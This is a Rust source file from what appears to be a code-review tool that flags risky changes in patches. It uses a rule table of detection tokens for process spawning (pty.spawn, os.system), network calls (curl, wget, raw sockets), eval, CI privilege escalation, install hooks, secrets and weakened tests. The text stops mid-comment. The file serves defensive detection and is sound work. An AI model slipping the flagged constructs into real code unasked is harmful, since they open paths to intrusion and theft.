// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! Every rule lives in one table, `RULES`: one signal, the side of the change it reads, the view it reads
//! (code with comments and strings blanked, or the raw line), where it applies, and what it
//! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
//! is safe, and a construct split across lines or built at run time can hide from it.

use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker, is_ident};
use deep_diff_forge_core::{FileStatus, HunkId, PatchHunk, PatchLine, PatchLineKind, ReviewFile};
use deep_diff_forge_syntax::{ConstructKind, FragmentScan, scan_fragment};

/// The basis of the first rung: what every item carried before [`Basis`] existed, and what an
/// item found by a token on one line still carries.
pub const EVIDENCE_BASIS: &str = Basis::Lexical.label();

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
    /// A test is switched off where it stands (`#[ignore]`, `pytest.mark.skip`, `it.skip(`,
    /// `t.Skip(`): it still reads as a test and checks nothing.
    TestSkipped,
    /// An assertion that cannot fail (`assert!(true)`, `assert True`, `expect(true).toBe(true)`).
    TrivialAssert,
    /// A placeholder where code should be (`todo!(`, `unimplemented!(`,
    /// `raise NotImplementedError`).
    StubAdded,
    /// An error is caught and dropped: an `except` whose body is `pass`, an empty `catch` block,
    /// an empty `if err != nil` block, `_ = err`, an `Err(_)` arm that does nothing.
    ErrorSwallowed,
    /// A call that panics on failure is added to code that is not a test (Rust `.unwrap()`,
    /// `.expect(`).
    PanicPathAdded,
    /// A Rust hunk holds words the parser checks (`unwrap`, `assert`, `todo`, `ignore`, …) and
    /// the parser did not read it: the hunk is over a budget, or the review's budget was spent
    /// before it. What the token rules found stands, and what only the parser finds (a
    /// construct over several lines) is not known. It says "not checked", never "bad".
    SyntaxUnchecked,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 15] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
        Self::TestSkipped,
        Self::TrivialAssert,
        Self::StubAdded,
        Self::ErrorSwallowed,
        Self::PanicPathAdded,
        Self::SyntaxUnchecked,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
            Self::TestSkipped => "test_skipped",
            Self::TrivialAssert => "trivial_assert",
            Self::StubAdded => "stub_added",
            Self::ErrorSwallowed => "error_swallowed",
            Self::PanicPathAdded => "panic_path_added",
            Self::SyntaxUnchecked => "syntax_unchecked",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch
            | Self::BuildHook
            | Self::TestRemoved
            | Self::TestSkipped
            | Self::TrivialAssert
            | Self::StubAdded
            | Self::ErrorSwallowed
            | Self::PanicPathAdded => 3,
            Self::CheckSuppressed => 2,
            Self::SyntaxUnchecked => 1,
        }
    }

    /// Whether the signal is about a test losing its force. Such a signal lives in test files, so
    /// a test path does not halve its weight as it does every other signal's.
    #[must_use]
    pub const fn weakens_a_test(self) -> bool {
        matches!(
            self,
            Self::TestRemoved | Self::TestSkipped | Self::TrivialAssert
        )
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// How an evidence item was found: the rung of the evidence ladder that confirmed it. A higher
/// rung sees more than a lower one, and an item states the highest that found it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Basis {
    /// One changed line, comments and strings blanked, matched by token.
    Lexical,
    /// A changed line read with its neighbours on the same side of the hunk.
    Hunk,
    /// The side of the hunk parsed as a fragment of its language: the construct itself, read
    /// by the parser, with no error above it.
    SyntaxFragment,
}

impl Basis {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lexical => "lexical",
            Self::Hunk => "hunk",
            Self::SyntaxFragment => "syntax_fragment",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The rung that found it ([`Basis`]).
    pub basis: Basis,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
}

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
    /// An error handler with nothing in it ([`empty_handler`]). It reads the line and the next
    /// line on the same side of the hunk, so what it finds has [`Basis::Hunk`].
    EmptyHandler,
    /// A call of a method with one of these names: `.name(` in the code view.
    Method(&'static [&'static str]),
    /// One of `heads` (a whole word, with no [`is_boundary_blocker`] before it) followed by one
    /// of `tails`, with any whitespace before the tail and between its bytes: `assert ! ( true )`
    /// is `assert` and `!(true)`. The parser reads such spellings too; these keep them found
    /// where the parser does not read (review V3 round 3, VD3R3-H-2).
    Spaced {
        heads: &'static [&'static str],
        tails: &'static [&'static str],
    },
    /// Rust `assert!(true)`, `assert!(true, …)`, `assert_eq!(true, true)`, `assert_eq!(true,
    /// true, …)` and their `debug_` forms, whatever the spacing ([`trivial_assert_rust`]).
    TrivialAssertRust,
    /// Rust `#[ignore]`, `#[ignore = "…"]` and `#[cfg_attr(…, ignore)]`, whatever the spacing
    /// ([`ignore_rust`]).
    IgnoreRust,
}

impl Match {
    /// The rung a match of this kind stands on.
    const fn basis(self) -> Basis {
        match self {
            Self::EmptyHandler => Basis::Hunk,
            Self::Tokens(_)
            | Self::AnyCode
            | Self::Secret
            | Self::Imports(_)
            | Self::Method(_)
            | Self::Spaced { .. }
            | Self::TrivialAssertRust
            | Self::IgnoreRust => Basis::Lexical,
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule. A test builds one positive case per token from this table, so a token
/// cannot be added without a case that finds it.
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        Match::Tokens(&["#[allow(", "#![allow("]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[test]", "#[tokio::test]", "#[rstest]"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
    // An attribute or a decorator is code, so a skip named in a comment or a string is not one.
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::IgnoreRust,
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "pytest.mark.skip*",
            "pytest.mark.xfail",
            "pytest.skip(",
            "unittest.skip*",
            "self.skipTest(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "it.skip(",
            "test.skip(",
            "describe.skip(",
            "it.skipIf(",
            "test.skipIf(",
            "describe.skipIf(",
            "it.todo(",
            "test.todo(",
            "xit(",
            "xtest(",
            "xdescribe(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["t.Skip(", "t.Skipf(", "t.SkipNow("]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::TrivialAssertRust,
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["assert True", "self.assertTrue(True)"]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "expect(true).toBe(true)",
            "expect(true).toEqual(true)",
            "assert(true)",
            "assert.ok(true)",
        ]),
    ),
    // A placeholder named in a message string is blanked with the string, so only the forms
    // that are code are read: JS and Go have none.
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Spaced {
            heads: &["todo", "unimplemented"],
            tails: &["!("],
        },
    ),
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["raise NotImplementedError"]),
    ),
    // An arm that names no error and does nothing is on one line: a token finds it.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Err(_) => {}", "Err(_) => ()"]),
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["_ = err"]),
    ),
    // The same calls written as functions (`Result::unwrap(x)`): no method call, so the parser's
    // construct does not cover them and the spelling is all there is.
    rule(
        S::PanicPathAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "Result::unwrap(",
            "Option::unwrap(",
            "Result::expect(",
            "Option::expect(",
        ]),
    ),
    // By spelling this cannot tell a test from other code: the path halves it on a test path,
    // and the parser withdraws it where the hunk shows a `#[cfg(test)]` around it
    // ([`fragment_evidence`]).
    rule(
        S::PanicPathAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Method(&["unwrap", "expect"]),
    ),
    // A handler and its empty body are often two lines: these read the next line too.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::EmptyHandler,
    ),
];

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// The most bytes of Rust hunks the parser reads in one review, both sides of a hunk counted.
/// Parsing costs time per byte, a review can hold tens of megabytes of hunks that are each
/// under the fragment budget, and a consumer gives the whole ranking a fixed time (review V3
/// round 2, VD3R2-H-2: a 61 MiB patch of a thousand 64 KB expressions ran past 15 s). Hunks
/// beyond the budget keep what the token rules found.
pub const REVIEW_FRAGMENT_BUDGET: usize = 2 * 1024 * 1024;

/// Which hunks of a review the parser may read: hunks of Rust files, in the review's own order,
/// until [`REVIEW_FRAGMENT_BUDGET`] is spent. It is made from the whole review before any file
/// is scored, so the answer for a hunk does not depend on which files were scored first or on
/// how many workers score them.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct FragmentPlan {
    allowed: Vec<Vec<bool>>,
}

impl FragmentPlan {
    /// The plan for `files`, the whole review in its order.
    #[must_use]
    pub fn of(files: &[ReviewFile]) -> Self {
        let mut spent = 0usize;
        let mut allowed = Vec::with_capacity(files.len());
        for file in files {
            let rust = FileKind::of(file).language == Some(Language::Rust);
            let mut hunks = Vec::with_capacity(file.patch_twin.hunks.len());
            for hunk in &file.patch_twin.hunks {
                let cost = if rust { fragment_cost(hunk) } else { None };
                let fits =
                    cost.is_some_and(|cost| spent.saturating_add(cost) <= REVIEW_FRAGMENT_BUDGET);
                if fits {
                    spent += cost.unwrap_or(0);
                }
                hunks.push(fits);
            }
            allowed.push(hunks);
        }
        Self { allowed }
    }

    /// For each hunk of the file at `index`, whether the parser may read it. Empty for an index
    /// the plan does not have: nothing is parsed.
    #[must_use]
    pub fn file(&self, index: usize) -> &[bool] {
        self.allowed.get(index).map_or(&[], Vec::as_slice)
    }

    /// Whether the parser may read hunk `hunk` of file `file`.
    #[must_use]
    pub fn allows(&self, file: usize, hunk: usize) -> bool {
        self.file(file).get(hunk).copied().unwrap_or(false)
    }
}

/// The words of the constructs the parser reads in a Rust hunk. A hunk with none of them on its
/// new side has nothing for the parser to find, costs nothing and is not parsed.
const PARSER_WORDS: [&str; 6] = [
    "unwrap",
    "expect",
    "assert",
    "todo",
    "unimplemented",
    "ignore",
];

/// Where a hunk that the parser should read, and did not, says so: `None` when the parser has
/// nothing to find in it. That is a hunk with no added line, or with none of the
/// [`PARSER_WORDS`] on any line of its new side. Unchanged lines count, since a construct can
/// open on one and reach an added line (`assert!(` unchanged, `true` added under it). The raw
/// text is read, comments and strings included: it errs toward checking. The place is the first
/// added line that holds a word, or else the first added line, by its index in `hunk.lines`.
fn first_parser_word(hunk: &PatchHunk) -> Option<usize> {
    let holds_word = |line: &PatchLine| PARSER_WORDS.iter().any(|word| line.text.contains(word));
    let added = |line: &PatchLine| line.kind == PatchLineKind::Added;
    let first_added = hunk.lines.iter().position(added)?;
    hunk.lines
        .iter()
        .position(|line| added(line) && holds_word(line))
        .or_else(|| {
            hunk.lines
                .iter()
                .any(|line| line.kind == PatchLineKind::Context && holds_word(line))
                .then_some(first_added)
        })
}

/// What parsing `hunk` costs against [`REVIEW_FRAGMENT_BUDGET`]: the bytes of its new side and,
/// up to one fragment, of its old side. `None` when it is not parsed at all: its new side holds
/// no word the parser reads ([`first_parser_word`]), or is over the fragment budget.
fn fragment_cost(hunk: &PatchHunk) -> Option<usize> {
    first_parser_word(hunk)?;
    let (mut new, mut old, mut added) = (0usize, 0usize, false);
    for line in &hunk.lines {
        let bytes = line.text.len() + 1;
        match line.kind {
            PatchLineKind::Context => {
                new += bytes;
                old += bytes;
            }
            PatchLineKind::Added => {
                new += bytes;
                added = true;
            }
            PatchLineKind::Removed => old += bytes,
        }
    }
    (added && new <= deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET)
        .then(|| new + old.min(deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET))
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]). The file
/// is planned on its own; a caller that holds the whole review uses [`file_evidence_in`].
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    file_evidence_in(file, FragmentPlan::of(std::slice::from_ref(file)).file(0))
}

/// [`file_evidence`] under a review's [`FragmentPlan`]: `parse` says, for each hunk of `file`,
/// whether the parser may read it (a hunk it does not name is not parsed).
#[must_use]
pub fn file_evidence_in(file: &ReviewFile, parse: &[bool]) -> Vec<Evidence> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let mut out: Vec<Evidence> = Vec::new();
    if rules.is_empty() {
        return out;
    }
    for (at, hunk) in file.patch_twin.hunks.iter().enumerate() {
        let parse = parse.get(at).copied().unwrap_or(false);
        let mut address = None;
        // `hunk_matches` yields each (side, signal, line) once and items from different hunks
        // differ in `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a
        // patch of 160k matching lines take 4.8 s.
        for (side, signal, line, basis) in
            hunk_matches(hunk, kind.language, &rules, parse, creates_whole_file(file))
        {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal,
                basis,
                hunk: hunk.id,
                address,
                side,
                line,
            });
        }
    }
    out
}

/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order: the labels the
/// outline and hunk views show. The same scan as [`file_evidence`], so a view never disagrees
/// with the rank. The file is planned on its own; a caller that holds the whole review uses
/// [`hunk_signals_in`].
#[must_use]
pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
    let plan = FragmentPlan::of(std::slice::from_ref(file));
    let at = file.patch_twin.hunks.iter().position(|h| h.id == hunk.id);
    hunk_signals_in(file, hunk, at.is_some_and(|at| plan.allows(0, at)))
}

/// [`hunk_signals`] under a review's [`FragmentPlan`]: `parse` is the plan's answer for `hunk`.
#[must_use]
pub fn hunk_signals_in(file: &ReviewFile, hunk: &PatchHunk, parse: bool) -> Vec<EvidenceSignal> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let found = hunk_matches(hunk, kind.language, &rules, parse, creates_whole_file(file));
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| found.iter().any(|(_, s, _, _)| s == signal))
        .collect()
}

/// `(side, signal, line, basis)` for every signal some rule finds on a changed line of `hunk`:
/// once per signal and line however many rules or tokens match, in [`EvidenceSignal::ALL`] order,
/// with the highest [`Basis`] among the rules that matched. Block comments and triple strings are
/// followed through the hunk on each side (state starts fresh per hunk). `parse` lets the parser
/// read a Rust hunk on top of that ([`FragmentPlan`]).
/// Whether `file` is a new file whose whole content is one hunk: the only patch whose hunk is
/// certain to be the file. See [`fragment_evidence`].
fn creates_whole_file(file: &ReviewFile) -> bool {
    file.status == FileStatus::Added && file.patch_twin.hunks.len() == 1
}

fn hunk_matches(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    parse: bool,
    whole_file: bool,
) -> Vec<(Side, EvidenceSignal, u32, Basis)> {
    // First the code view of every line on each side it belongs to, so a rule that reads a
    // neighbour sees it as code, in the state the scanner reached there.
    let mut old_state = ScanState::default();
    let mut new_state = ScanState::default();
    let views: Vec<(Option<String>, Option<String>)> = hunk
        .lines
        .iter()
        .map(|line| {
            let view = |state: &mut ScanState| language.map(|l| code_view(l, &line.text, state));
            match line.kind {
                PatchLineKind::Context => (view(&mut old_state), view(&mut new_state)),
                PatchLineKind::Added => (None, view(&mut new_state)),
                PatchLineKind::Removed => (view(&mut old_state), None),
            }
        })
        .collect();
    // The code of the next line on `side` after line `at`: the line that follows it in that
    // version of the file, when the hunk holds it.
    let next_on = |side: Side, at: usize| -> Option<&str> {
        let other = match side {
            Side::New => PatchLineKind::Removed,
            Side::Old => PatchLineKind::Added,
        };
        let next = at + 1 + hunk.lines[at + 1..].iter().position(|l| l.kind != other)?;
        let view = match side {
            Side::New => views[next].1.as_deref(),
            Side::Old => views[next].0.as_deref(),
        };
        Some(view.unwrap_or(hunk.lines[next].text.as_str()))
    };
    // Rung 2, asked before the lines are read so that its answer is merged line by line and the
    // items come out in hunk order with no sorting (a hunk can hold a million of them). A Rust
    // hunk that holds a word the parser reads, and that the parser did not read (the plan did
    // not allow it, it is over the fragment budget, or the parser gave no answer), says so on
    // one line. Otherwise whoever orders the hunks of a review could spend the parser's budget
    // and have a later construct that only the parser finds go unseen, with nothing to show
    // for it (review V3 round 3, VD3R3-H-2).
    let word = if language == Some(Language::Rust) {
        first_parser_word(hunk)
    } else {
        None
    };
    let parsed = match word {
        Some(_) if parse => fragment_evidence(hunk, &views, whole_file),
        _ => None,
    };
    let unchecked = match &parsed {
        None => word,
        Some(parsed) => parsed.unread,
    };
    let mut found = Vec::new();
    for (at, line) in hunk.lines.iter().enumerate() {
        let (side, number, view) = match line.kind {
            PatchLineKind::Context => continue,
            PatchLineKind::Added => (Side::New, line.new_line, views[at].1.as_deref()),
            PatchLineKind::Removed => (Side::Old, line.old_line, views[at].0.as_deref()),
        };
        let Some(number) = number else { continue };
        let hits = |rule: &Rule| {
            let text = match rule.view {
                View::Raw => line.text.as_str(),
                // A rule that reads code needs a language; `Scope::Any` code rules have none.
                View::Code => view.unwrap_or(line.text.as_str()),
            };
            match rule.matches {
                Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                Match::AnyCode => !text.trim().is_empty(),
                Match::Secret => looks_like_secret(text),
                Match::Imports(modules) => imports_module(text, &line.text, modules),
                Match::EmptyHandler => {
                    language.is_some_and(|l| empty_handler(l, text, next_on(side, at)))
                }
                Match::Method(names) => names.iter().any(|name| calls_method(text, name)),
                Match::Spaced { heads, tails } => spaced(text, heads, tails),
                Match::TrivialAssertRust => trivial_assert_rust(text),
                Match::IgnoreRust => ignore_rust(text),
            }
        };
        for signal in EvidenceSignal::ALL {
            let mut basis = rules
                .iter()
                .filter(|r| r.signal == signal && r.side == side && hits(r))
                .map(|r| r.matches.basis())
                .max();
            if side == Side::New {
                if signal == S::SyntaxUnchecked && unchecked == Some(at) {
                    basis = Some(Basis::Lexical);
                }
                // What the parser found is added, or its basis raised; a panic path inside code
                // the hunk proves to be test-only is withdrawn. Where the parser could not
                // read, the lower rungs' answer stands.
                if let Some(parsed) = &parsed {
                    if Parsed::has(&parsed.found, at, signal) {
                        basis = basis.max(Some(Basis::SyntaxFragment));
                    } else if Parsed::has(&parsed.withdrawn, at, signal) {
                        basis = None;
                    }
                }
            }
            if let Some(basis) = basis {
                found.push((side, signal, number, basis));
            }
        }
    }
    found
}

/// Whether `code` calls a method named `name`: `.name(`, with nothing but whitespace between the
/// dot, the name and the parenthesis (`value.unwrap ()` is the same call).
fn calls_method(code: &str, name: &str) -> bool {
    code.match_indices(name).any(|(at, _)| {
        code[..at].trim_end().ends_with('.')
            && code[at + name.len()..].trim_start().starts_with('(')
    })
}

/// Whether `text` holds one of `heads`, whole and with no [`is_boundary_blocker`] byte before
/// it, followed by one of `tails` ([`follows`]): `todo ! (` holds `todo` and `!(`.
///
